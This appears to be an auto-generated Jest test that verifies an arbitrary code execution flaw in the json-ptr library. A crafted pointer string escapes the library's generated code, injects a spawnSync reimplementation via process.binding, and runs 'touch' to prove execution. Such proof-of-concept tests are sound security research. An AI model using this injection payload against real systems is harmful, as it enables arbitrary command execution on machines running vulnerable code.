const v29 = () => {
    const v16 = expect.assertions(2);
    v16;
    const fs = require('fs');
    const jptr = require('json-ptr');
    const path = './json-ptr';
    file_exist = fs.existsSync(path);
    const v17 = {};
    const v18 = v17.polluted;
    const v19 = expect(v18);
    const v20 = v19.toBe(undefined);
    v20;
    JsonPointer = jptr.JsonPointer;
    try {
        let customSpawn = 'spawn_sync = process.binding(`spawn_sync`);normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};';
        const v21 = {};
        const v22 = `/aaa'])) !== 'undefined') {return it;}; ${ customSpawn }; spawnSync("touch",["json-ptr"]); if(((['a`;
        const v23 = JsonPointer.get(v21, v22);
        v23;
    } catch (error) {
        const v24 = console.log('err===>', error);
        v24;
    }
    file_exist = fs.existsSync(path);
    const v25 = expect(file_exist);
    const v26 = v25.toBe(true);
    v26;
    const v27 = function (err) {
    };
    const v28 = fs.unlink(path, v27);
    v28;
};
const v30 = test('Arbitrary code execution in json-ptr', v29);
v30;